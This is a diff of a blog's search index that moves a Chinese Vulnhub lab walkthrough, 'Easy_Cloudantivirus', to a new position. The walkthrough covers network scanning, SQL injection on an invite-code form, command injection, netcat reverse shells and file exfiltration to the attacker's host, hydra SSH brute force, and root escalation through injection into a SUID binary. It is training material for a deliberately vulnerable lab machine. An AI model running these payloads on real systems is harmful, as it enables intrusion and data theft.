@@ -548,6 +548,155 @@
       </tags>
   </entry>
   <entry>
+    <title>Easy_Cloudantivirus</title>
+    <url>/2023/08/13/Vulnhub_Kali/02.Easy_Cloudantivirus_20230813/</url>
+    <content><![CDATA[<ul>
+<li>填坑系列（二）启动，总体难度不大，主要考验思路（这篇原文放在自己语雀了，所以下述时间会不对上）。</li>
+<li>靶机地址：<a href="https://www.vulnhub.com/entry/boredhackerblog-cloud-av,453/">https://www.vulnhub.com/entry/boredhackerblog-cloud-av,453/</a></li>
+<li>Vulnhub 的靶机都有一个特点，通常导入到 VMware Workstation 时都会获取不到 IP 地址，虽然可以进紧急模式中修改，但是太麻烦了，还是将 Kali 和靶机桥接吧。</li>
+</ul>
+<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><ul>
+<li>由于将 Kali 与 VulnHub 使用 Virtual Box 仅主机网卡进行了桥接，所以使用 Kali 去扫描靶机。</li>
+<li>首先查看 Kali IP 地址：</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# ifconfig</span><br><span class="line">eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 192.168.56.105  netmask 255.255.255.0  broadcast 192.168.56.255</span><br><span class="line">        inet6 fe80::adc5:106b:ff3c:9390  prefixlen 64  scopeid 0x20&lt;link&gt;</span><br><span class="line">        ether 00:0c:29:a8:8a:0b  txqueuelen 1000  (Ethernet)</span><br><span class="line">        RX packets 24  bytes 10921 (10.6 KiB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 549  bytes 40698 (39.7 KiB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>扫描当前网段，发现靶机 IP 地址：</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# arp-scan 192.168.56.0/24</span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:0c:29:a8:8a:0b, IPv4: 192.168.56.105</span><br><span class="line">Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.56.1    0a:00:27:00:00:1a       (Unknown: locally administered)</span><br><span class="line">192.168.56.100  08:00:27:ea:40:88       PCS Systemtechnik GmbH</span><br><span class="line">192.168.56.107  08:00:27:1e:54:35       PCS Systemtechnik GmbH</span><br><span class="line"></span><br><span class="line">3 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.9.7: 256 hosts scanned in 1.987 seconds (128.84 hosts/sec). 3 responded</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>继续使用 Nmap 扫描端口、开放服务等信息：</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# nmap -p- 192.168.56.107</span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-07 02:31 EST</span><br><span class="line">Nmap scan report for 192.168.56.107</span><br><span class="line">Host is up (0.00058s latency).</span><br><span class="line">Not shown: 65533 closed tcp ports (reset)</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">22/tcp   open  ssh</span><br><span class="line">8080/tcp open  http-proxy</span><br><span class="line">MAC Address: 08:00:27:1E:54:35 (Oracle VirtualBox virtual NIC)</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 17.75 seconds</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# nmap -p 22,8080 -sV 192.168.56.107</span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-07 02:32 EST</span><br><span class="line">Nmap scan report for 192.168.56.107</span><br><span class="line">Host is up (0.00057s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">8080/tcp open  http    Werkzeug httpd 0.14.1 (Python 2.7.15rc1)</span><br><span class="line">MAC Address: 08:00:27:1E:54:35 (Oracle VirtualBox virtual NIC)</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 19.64 seconds</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>扫描出 8080 端口的 Web 服务，通常情况下不考虑 SSH 爆破，访问一下 Web 服务：</li>
+</ul>
+<img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830222318218.png" alt="image-20230830222318218" />
+
+<ul>
+<li><p>只有一个输入框，需要使用邀请码登录。没啥多余的东西，这时一般是存在两种方法：</p>
+<ul>
+<li><p>暴力破解</p>
+</li>
+<li><p>SQL 注入</p>
+</li>
+</ul>
+</li>
+</ul>
+<h1 id="SQL-注入"><a href="#SQL-注入" class="headerlink" title="SQL 注入"></a>SQL 注入</h1><ul>
+<li>在输入框进行测试，当使用双引号时，页面出现报错：</li>
+</ul>
+<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830222346521.png" alt="image-20230830222346521"></p>
+<ul>
+<li>并且在页面上出现了 SQL 查询语句：</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">if len(c.execute(&#x27;select * from code where password=&quot;&#x27; + password + &#x27;&quot;&#x27;).fetchall()) &gt; 0:</span><br><span class="line"></span><br><span class="line">select * from code where password=&quot;&#x27; + password + &#x27;&quot;</span><br><span class="line"></span><br><span class="line">select * from code where password=&quot; &quot;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>发现闭合符号为双引号，尝试闭合：</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&quot; or 1 = 1 --+</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830222404690.png" alt="image-20230830222404690"></p>
+<ul>
+<li>闭合成功，按钮变为 Scan，扫个 hello 试试：</li>
+</ul>
+<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830222417126.png" alt="image-20230830222417126"></p>
+<h1 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h1><ul>
+<li>猜测后端代码逻辑为，尝试是否存在命令执行：</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">scan hello</span><br><span class="line"></span><br><span class="line">scan hello ; ls</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>发现执行成功，显示出文件：</li>
+</ul>
+<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830222437476.png" alt="image-20230830222437476"></p>
+<h1 id="Shell-反弹"><a href="#Shell-反弹" class="headerlink" title="Shell 反弹"></a>Shell 反弹</h1><ul>
+<li>由于对端是 Linux 系统，查看一下是否存在 NC：</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hello | which nc</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830222459677.png" alt="image-20230830222459677"></p>
+<ul>
+<li>发现存在有 NC，使用 NC 进行 Shell 反弹：</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Kali 上使用 NC 开启监听</span></span><br><span class="line">nc -lvvp 4444</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# nc -lvvp 4444                     </span><br><span class="line">listening on [any] 4444 ...</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在靶机上进行反弹</span></span><br><span class="line">hello | nc 192.168.56.105 4444 -e /bin/sh # 执行失败，可能是此版本的 NC 不支持 -e 参数</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在 Kali 上开启两个监听端口</span></span><br><span class="line">nc -lvvp 3333</span><br><span class="line">nc -lvvp 4444</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在靶机上反弹</span></span><br><span class="line">hello |nc 192.168.56.105 3333 |/bin/bash |nc 192.168.56.105 4444 # 当不支持 -e 参数时，使用 NC 进行串联</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830222511694.png" alt="image-20230830222511694"></p>
+<h1 id="文件传输"><a href="#文件传输" class="headerlink" title="文件传输"></a>文件传输</h1><ul>
+<li>在当前目录下发现了一个 SQL 文件，使用 NC 将其下载到 Kali 上：</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在 Kali 上再开一个 NC 监听用于传输文件</span></span><br><span class="line">nc -lvvp 5555</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在 NC 的 3333 端口上进行文件传输</span></span><br><span class="line">nc 192.168.56.105 5555 &lt; database.sql</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830222530665.png" alt="image-20230830222530665"></p>
+<ul>
+<li>经过判断，发现是一个 sqlite 文件，将其导入到 sqlite 中查看：</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# sqlite3</span><br><span class="line">SQLite version 3.39.2 2022-07-21 15:24:47</span><br><span class="line">Enter &quot;.help&quot; for usage hints.</span><br><span class="line">Connected to a transient in-memory database.</span><br><span class="line">Use &quot;.open FILENAME&quot; to reopen on a persistent database.</span><br><span class="line"><span class="meta prompt_">sqlite&gt; </span><span class="language-bash">.open db.sql</span></span><br><span class="line"><span class="meta prompt_">sqlite&gt; </span><span class="language-bash">.database</span></span><br><span class="line">main: /root/db.sql r/w</span><br><span class="line"><span class="meta prompt_">sqlite&gt; </span><span class="language-bash">.dump</span></span><br><span class="line">PRAGMA foreign_keys=OFF;</span><br><span class="line">BEGIN TRANSACTION;</span><br><span class="line">CREATE TABLE `code` (</span><br><span class="line">        `password`      TEXT</span><br><span class="line">);</span><br><span class="line">INSERT INTO code VALUES(&#x27;myinvitecode123&#x27;);</span><br><span class="line">INSERT INTO code VALUES(&#x27;mysecondinvitecode&#x27;);</span><br><span class="line">INSERT INTO code VALUES(&#x27;cloudavtech&#x27;);</span><br><span class="line">INSERT INTO code VALUES(&#x27;mostsecurescanner&#x27;);</span><br><span class="line">COMMIT;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>建档尝试了一下，发现是开头登录的邀请码，好像没啥用，那就先放一放。</li>
+<li>查看一下当前靶机的所有用户：</li>
+</ul>
+<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830222622625.png" alt="image-20230830222622625"></p>
+<ul>
+<li>发现两个用户，但是好像也没用。</li>
+</ul>
+<h1 id="SSH-爆破"><a href="#SSH-爆破" class="headerlink" title="SSH 爆破"></a>SSH 爆破</h1><ul>
+<li>根据上面数据库文件找到的密码和此处找到的用户，使用 hydra 进行爆破：</li>
+<li>创建用户、密码字典：</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">user.txt</span></span><br><span class="line">vim user.txt</span><br><span class="line"></span><br><span class="line">root</span><br><span class="line">cloudav</span><br><span class="line">scanner</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">pass.txt</span></span><br><span class="line">vim pass.txt</span><br><span class="line"></span><br><span class="line">myinvitecode123</span><br><span class="line">mysecondinvitecode</span><br><span class="line">cloudavtech</span><br><span class="line">mostsecurescanner</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>输入如下命令进行 SSH 爆破：</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hydra -L user.txt -P pass.txt ssh://192.168.56.107</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830222647291.png" alt="image-20230830222647291"></p>
+<ul>
+<li>爆破失败..</li>
+</ul>
+<h1 id="SUID-提权"><a href="#SUID-提权" class="headerlink" title="SUID 提权"></a>SUID 提权</h1><ul>
+<li>再次去翻一翻文件，发现一个文件的权限不大对劲：</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd .. | ls -al</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830222707568.png" alt="image-20230830222707568"></p>
+<ul>
+<li>查看一下源码文件内容：</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat update_cloudav.c</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">include &lt;stdio.h&gt;</span></span><br><span class="line"></span><br><span class="line">int main(int argc, char *argv[])</span><br><span class="line">&#123;</span><br><span class="line">char *freshclam=&quot;/usr/bin/freshclam&quot;;</span><br><span class="line"></span><br><span class="line">if (argc &lt; 2)&#123;</span><br><span class="line">printf(&quot;This tool lets you update antivirus rules\nPlease supply command line arguments for freshclam\n&quot;);</span><br><span class="line">return 1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">char *command = malloc(strlen(freshclam) + strlen(argv[1]) + 2);</span><br><span class="line">sprintf(command, &quot;%s %s&quot;, freshclam, argv[1]);</span><br><span class="line">setgid(0);</span><br><span class="line">setuid(0);</span><br><span class="line">system(command);</span><br><span class="line">return 0;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>其中有句：<code>This tool lets you update antivirus rules, Please supply command line arguments for freshclam</code>，翻译一下是说明可以在后面添加参数，尝试一下：</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">随便加一个参数</span></span><br><span class="line">./update_cloudav &quot;123&quot; # 显示报错：ERROR: /var/log/clamav/freshclam.log is locked by another process</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">不管他，尝试命令执行</span></span><br><span class="line">./update_cloudav &quot;123 | ls&quot; # 执行成功！</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>既然上述命令执行可以实现，再来一次 NC Shell 反弹：</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在 Kali 上开启两个监听端口</span></span><br><span class="line">nc -lvvp 6666</span><br><span class="line">nc -lvvp 7777</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在靶机上反弹</span></span><br><span class="line">./update_cloudav &quot;123 |nc 192.168.56.105 6666 |/bin/bash |nc 192.168.56.105 7777&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830222824468.png" alt="image-20230830222824468"></p>
+<ul>
+<li>提权成功！打靶结束。</li>
+</ul>
+<h1 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h1><ul>
+<li>在使用 SQL 注入时，也可以使用 BurpSuite 进行爆破，但是很容易扫崩，需要控制一下速率。</li>
+</ul>
+]]></content>
+      <categories>
+        <category>Vulnhub</category>
+      </categories>
+      <tags>
+        <tag>Vulnhub</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Medium_Socnet</title>
     <url>/2023/08/12/Vulnhub_Kali/01.Medium_Socnet_20230812/</url>
     <content><![CDATA[<ul>
@@ -787,155 +936,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Easy_Cloudantivirus</title>
-    <url>/2023/08/13/Vulnhub_Kali/02.Easy_Cloudantivirus_20230813/</url>
-    <content><![CDATA[<ul>
-<li>填坑系列（二）启动，总体难度不大，主要考验思路（这篇原文放在自己语雀了，所以下述时间会不对上）。</li>
-<li>靶机地址：<a href="https://www.vulnhub.com/entry/boredhackerblog-cloud-av,453/">https://www.vulnhub.com/entry/boredhackerblog-cloud-av,453/</a></li>
-<li>Vulnhub 的靶机都有一个特点，通常导入到 VMware Workstation 时都会获取不到 IP 地址，虽然可以进紧急模式中修改，但是太麻烦了，还是将 Kali 和靶机桥接吧。</li>
-</ul>
-<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><ul>
-<li>由于将 Kali 与 VulnHub 使用 Virtual Box 仅主机网卡进行了桥接，所以使用 Kali 去扫描靶机。</li>
-<li>首先查看 Kali IP 地址：</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# ifconfig</span><br><span class="line">eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 192.168.56.105  netmask 255.255.255.0  broadcast 192.168.56.255</span><br><span class="line">        inet6 fe80::adc5:106b:ff3c:9390  prefixlen 64  scopeid 0x20&lt;link&gt;</span><br><span class="line">        ether 00:0c:29:a8:8a:0b  txqueuelen 1000  (Ethernet)</span><br><span class="line">        RX packets 24  bytes 10921 (10.6 KiB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 549  bytes 40698 (39.7 KiB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>扫描当前网段，发现靶机 IP 地址：</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# arp-scan 192.168.56.0/24</span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:0c:29:a8:8a:0b, IPv4: 192.168.56.105</span><br><span class="line">Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.56.1    0a:00:27:00:00:1a       (Unknown: locally administered)</span><br><span class="line">192.168.56.100  08:00:27:ea:40:88       PCS Systemtechnik GmbH</span><br><span class="line">192.168.56.107  08:00:27:1e:54:35       PCS Systemtechnik GmbH</span><br><span class="line"></span><br><span class="line">3 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.9.7: 256 hosts scanned in 1.987 seconds (128.84 hosts/sec). 3 responded</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>继续使用 Nmap 扫描端口、开放服务等信息：</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# nmap -p- 192.168.56.107</span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-07 02:31 EST</span><br><span class="line">Nmap scan report for 192.168.56.107</span><br><span class="line">Host is up (0.00058s latency).</span><br><span class="line">Not shown: 65533 closed tcp ports (reset)</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">22/tcp   open  ssh</span><br><span class="line">8080/tcp open  http-proxy</span><br><span class="line">MAC Address: 08:00:27:1E:54:35 (Oracle VirtualBox virtual NIC)</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 17.75 seconds</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# nmap -p 22,8080 -sV 192.168.56.107</span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-07 02:32 EST</span><br><span class="line">Nmap scan report for 192.168.56.107</span><br><span class="line">Host is up (0.00057s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">8080/tcp open  http    Werkzeug httpd 0.14.1 (Python 2.7.15rc1)</span><br><span class="line">MAC Address: 08:00:27:1E:54:35 (Oracle VirtualBox virtual NIC)</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 19.64 seconds</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>扫描出 8080 端口的 Web 服务，通常情况下不考虑 SSH 爆破，访问一下 Web 服务：</li>
-</ul>
-<img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830222318218.png" alt="image-20230830222318218" />
-
-<ul>
-<li><p>只有一个输入框，需要使用邀请码登录。没啥多余的东西，这时一般是存在两种方法：</p>
-<ul>
-<li><p>暴力破解</p>
-</li>
-<li><p>SQL 注入</p>
-</li>
-</ul>
-</li>
-</ul>
-<h1 id="SQL-注入"><a href="#SQL-注入" class="headerlink" title="SQL 注入"></a>SQL 注入</h1><ul>
-<li>在输入框进行测试，当使用双引号时，页面出现报错：</li>
-</ul>
-<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830222346521.png" alt="image-20230830222346521"></p>
-<ul>
-<li>并且在页面上出现了 SQL 查询语句：</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">if len(c.execute(&#x27;select * from code where password=&quot;&#x27; + password + &#x27;&quot;&#x27;).fetchall()) &gt; 0:</span><br><span class="line"></span><br><span class="line">select * from code where password=&quot;&#x27; + password + &#x27;&quot;</span><br><span class="line"></span><br><span class="line">select * from code where password=&quot; &quot;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>发现闭合符号为双引号，尝试闭合：</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&quot; or 1 = 1 --+</span><br></pre></td></tr></table></figure>
-
-<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830222404690.png" alt="image-20230830222404690"></p>
-<ul>
-<li>闭合成功，按钮变为 Scan，扫个 hello 试试：</li>
-</ul>
-<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830222417126.png" alt="image-20230830222417126"></p>
-<h1 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h1><ul>
-<li>猜测后端代码逻辑为，尝试是否存在命令执行：</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">scan hello</span><br><span class="line"></span><br><span class="line">scan hello ; ls</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>发现执行成功，显示出文件：</li>
-</ul>
-<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830222437476.png" alt="image-20230830222437476"></p>
-<h1 id="Shell-反弹"><a href="#Shell-反弹" class="headerlink" title="Shell 反弹"></a>Shell 反弹</h1><ul>
-<li>由于对端是 Linux 系统，查看一下是否存在 NC：</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hello | which nc</span><br></pre></td></tr></table></figure>
-
-<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830222459677.png" alt="image-20230830222459677"></p>
-<ul>
-<li>发现存在有 NC，使用 NC 进行 Shell 反弹：</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Kali 上使用 NC 开启监听</span></span><br><span class="line">nc -lvvp 4444</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# nc -lvvp 4444                     </span><br><span class="line">listening on [any] 4444 ...</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在靶机上进行反弹</span></span><br><span class="line">hello | nc 192.168.56.105 4444 -e /bin/sh # 执行失败，可能是此版本的 NC 不支持 -e 参数</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在 Kali 上开启两个监听端口</span></span><br><span class="line">nc -lvvp 3333</span><br><span class="line">nc -lvvp 4444</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在靶机上反弹</span></span><br><span class="line">hello |nc 192.168.56.105 3333 |/bin/bash |nc 192.168.56.105 4444 # 当不支持 -e 参数时，使用 NC 进行串联</span><br></pre></td></tr></table></figure>
-
-<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830222511694.png" alt="image-20230830222511694"></p>
-<h1 id="文件传输"><a href="#文件传输" class="headerlink" title="文件传输"></a>文件传输</h1><ul>
-<li>在当前目录下发现了一个 SQL 文件，使用 NC 将其下载到 Kali 上：</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在 Kali 上再开一个 NC 监听用于传输文件</span></span><br><span class="line">nc -lvvp 5555</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在 NC 的 3333 端口上进行文件传输</span></span><br><span class="line">nc 192.168.56.105 5555 &lt; database.sql</span><br></pre></td></tr></table></figure>
-
-<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830222530665.png" alt="image-20230830222530665"></p>
-<ul>
-<li>经过判断，发现是一个 sqlite 文件，将其导入到 sqlite 中查看：</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# sqlite3</span><br><span class="line">SQLite version 3.39.2 2022-07-21 15:24:47</span><br><span class="line">Enter &quot;.help&quot; for usage hints.</span><br><span class="line">Connected to a transient in-memory database.</span><br><span class="line">Use &quot;.open FILENAME&quot; to reopen on a persistent database.</span><br><span class="line"><span class="meta prompt_">sqlite&gt; </span><span class="language-bash">.open db.sql</span></span><br><span class="line"><span class="meta prompt_">sqlite&gt; </span><span class="language-bash">.database</span></span><br><span class="line">main: /root/db.sql r/w</span><br><span class="line"><span class="meta prompt_">sqlite&gt; </span><span class="language-bash">.dump</span></span><br><span class="line">PRAGMA foreign_keys=OFF;</span><br><span class="line">BEGIN TRANSACTION;</span><br><span class="line">CREATE TABLE `code` (</span><br><span class="line">        `password`      TEXT</span><br><span class="line">);</span><br><span class="line">INSERT INTO code VALUES(&#x27;myinvitecode123&#x27;);</span><br><span class="line">INSERT INTO code VALUES(&#x27;mysecondinvitecode&#x27;);</span><br><span class="line">INSERT INTO code VALUES(&#x27;cloudavtech&#x27;);</span><br><span class="line">INSERT INTO code VALUES(&#x27;mostsecurescanner&#x27;);</span><br><span class="line">COMMIT;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>建档尝试了一下，发现是开头登录的邀请码，好像没啥用，那就先放一放。</li>
-<li>查看一下当前靶机的所有用户：</li>
-</ul>
-<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830222622625.png" alt="image-20230830222622625"></p>
-<ul>
-<li>发现两个用户，但是好像也没用。</li>
-</ul>
-<h1 id="SSH-爆破"><a href="#SSH-爆破" class="headerlink" title="SSH 爆破"></a>SSH 爆破</h1><ul>
-<li>根据上面数据库文件找到的密码和此处找到的用户，使用 hydra 进行爆破：</li>
-<li>创建用户、密码字典：</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">user.txt</span></span><br><span class="line">vim user.txt</span><br><span class="line"></span><br><span class="line">root</span><br><span class="line">cloudav</span><br><span class="line">scanner</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">pass.txt</span></span><br><span class="line">vim pass.txt</span><br><span class="line"></span><br><span class="line">myinvitecode123</span><br><span class="line">mysecondinvitecode</span><br><span class="line">cloudavtech</span><br><span class="line">mostsecurescanner</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>输入如下命令进行 SSH 爆破：</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hydra -L user.txt -P pass.txt ssh://192.168.56.107</span><br></pre></td></tr></table></figure>
-
-<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830222647291.png" alt="image-20230830222647291"></p>
-<ul>
-<li>爆破失败..</li>
-</ul>
-<h1 id="SUID-提权"><a href="#SUID-提权" class="headerlink" title="SUID 提权"></a>SUID 提权</h1><ul>
-<li>再次去翻一翻文件，发现一个文件的权限不大对劲：</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd .. | ls -al</span><br></pre></td></tr></table></figure>
-
-<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830222707568.png" alt="image-20230830222707568"></p>
-<ul>
-<li>查看一下源码文件内容：</li>
-</ul>
